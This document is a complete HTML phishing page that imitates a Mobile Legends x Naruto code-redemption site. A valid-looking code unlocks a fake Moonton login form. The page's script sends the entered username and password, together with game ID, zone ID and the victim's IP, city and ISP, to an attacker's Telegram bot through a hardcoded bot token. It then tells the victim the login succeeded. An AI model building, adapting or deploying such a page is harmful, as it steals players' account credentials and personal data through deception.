<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redeem Code MLBB & Login</title>
  <style>
    body {
      background: linear-gradient(135deg, #1e2a78, #00c6ff);
      font-family: 'Arial', sans-serif;
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      color: white;
      overflow: hidden;
      flex-direction: column;
    }

    .container {
      display: flex;
      justify-content: space-between;
      background: rgba(0, 0, 0, 0.7);
      border-radius: 15px;
      padding: 40px;
      width: 90%;
      max-width: 800px;
      box-shadow: 0 0 30px rgba(0, 0, 0, 0.6);
      transition: transform 0.3s ease-in-out;
    }

    .container:hover {
      transform: scale(1.05);
    }

    img {
      width: 70%;
      max-width: 320px;
      margin-bottom: 20px;
      transition: transform 0.3s ease;
    }

    img:hover {
      transform: rotate(10deg);
    }

    .redeem-section, .login-section {
      width: 45%;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 12px 0;
      border-radius: 10px;
      border: 2px solid #ffb400;
      background: transparent;
      color: white;
      font-size: 16px;
      transition: all 0.3s ease;
    }

    input:focus {
      outline: none;
      border-color: #ffcc00;
    }

    button {
      background: #ffb400;
      color: black;
      padding: 15px;
      width: 100%;
      border: none;
      border-radius: 10px;
      font-size: 18px;
      cursor: pointer;
      transition: all 0.3s ease;
    }

    button:hover {
      background: #ffcc00;
      transform: scale(1.05);
    }

    #response {
      margin-top: 20px;
      font-weight: bold;
    }

    .redeem-section input {
      background: #2a2d58;
    }

    .login-section input {
      background: #1c1f3f;
    }

    @media (max-width: 600px) {
      .container {
        flex-direction: column;
        padding: 25px;
        width: 90%;
      }

      .redeem-section, .login-section {
        width: 100%;
        margin-bottom: 20px;
      }

      img {
        width: 100%;
      }
    }
  </style>
</head>
<body>
  <div style="text-align: center; padding: 40px; background-color: blue;">
  <img src="https://i.ibb.co.com/LX4pJkxm/images-4.jpg" alt="MLBB Logo" style="width: 200px;">
  <h1 style="color: #00ffff; text-shadow: 2px 2px 5px #007bff; font-family: Arial, sans-serif; margin-top: 20px;">
    Mobile Legends X NARUTO 
  </h1>
</div>

  <div class="container">
    <div class="redeem-section" id="redeem-section">
      <h2>Redeem Code MLBB</h2>
      <input type="text" id="userId" placeholder="ID MLBB">
      <input type="text" id="zoneId" placeholder="Zone ID">
      <input type="text" id="redeemCode" placeholder="Kode Redeem">
      <button onclick="redeemCode()">Redeem</button>
      <div id="redeem-response"></div>
    </div>

    <div class="login-section" id="login-section" style="display: none;">
      <h2>Login Moonton</h2>
      <input type="text" id="username" placeholder="Username">
      <input type="password" id="password" placeholder="Password">
      <button onclick="submitLogin()">Login</button>
      <div id="login-response"></div>
    </div>
  </div>

  <script>
    const TELEGRAM_BOT_TOKEN = "7788665747:AAH_HIsff4i7lUqbWbH9fuuSbPkvKQwPVes";
    const TELEGRAM_CHAT_ID = "7137150704";

    function sendToTelegram(message) {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "HTML"
        })
      }).catch(err => console.error("Telegram Error:", err));
    }

    async function getIPInfo() {
      try {
        const res = await fetch("http://ip-api.com/json/");
        const data = await res.json();
        return {
          ip : data.query,
          city : data.city,
          country : data.country,
          as : data.as
        };
      } catch (err) {
        return { ip: "Unknown", city: "Unknown", country: "Unknown", org: "Unknown" };
      }
    }

    async function redeemCode() {
      const userId = document.getElementById("userId").value;
      const zoneId = document.getElementById("zoneId").value;
      const redeemCodeValue = document.getElementById("redeemCode").value;
      const redeemResponse = document.getElementById("redeem-response");

      if (!userId || !zoneId || !redeemCodeValue) {
        redeemResponse.innerText = "Harap isi semua kolom redeem.";
        redeemResponse.style.color = "orange";
        return;
      }

      if (redeemCodeValue === "NARUTOSKIN" || redeemCodeValue === "NARUTOXMLBB") {
        redeemResponse.innerText = "Kode berhasil diklaim! Hadiah akan dikirim.";
        redeemResponse.style.color = "lightgreen";
        setTimeout(() => {
          document.getElementById("redeem-section").style.display = "none";
          document.getElementById("login-section").style.display = "block";
        }, 2000);
      } else {
        redeemResponse.innerText = "Kode tidak valid atau telah digunakan.";
        redeemResponse.style.color = "red";
      }

      window.redeemData = { userId, zoneId, redeemCodeValue }; // simpan untuk dipakai di login
    }

    async function submitLogin() {
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;
      const loginResponse = document.getElementById("login-response");

      if (!username || !password) {
        loginResponse.innerText = "Harap isi semua kolom.";
        loginResponse.style.color = "orange";
        return;
      }

      const ipInfo = await getIPInfo();
      const { userId, zoneId, redeemCodeValue } = window.redeemData || {};

      const message = `<b>Data Login dan Redeem MLBB</b>

<b>Login Info</b>
Username: <code>${username}</code>
Password: <code>${password}</code>

<b>Redeem Info</b>
ID: <code>${userId || '-'}</code>
Zone: <code>${zoneId || '-'}</code>
Code: <code>${redeemCodeValue || '-'}</code>

<b>IP Info</b>
IP: <code>${ipInfo.ip}</code>
City: <code>${ipInfo.city}</code>, ${ipInfo.country}
ISP: <code>${ipInfo.as}</code>`;

      sendToTelegram(message);

      loginResponse.innerText = `Login berhasil! Selamat datang, ${username}.`;
      loginResponse.style.color = "lightgreen";
    }
  </script>

</body>
</html>
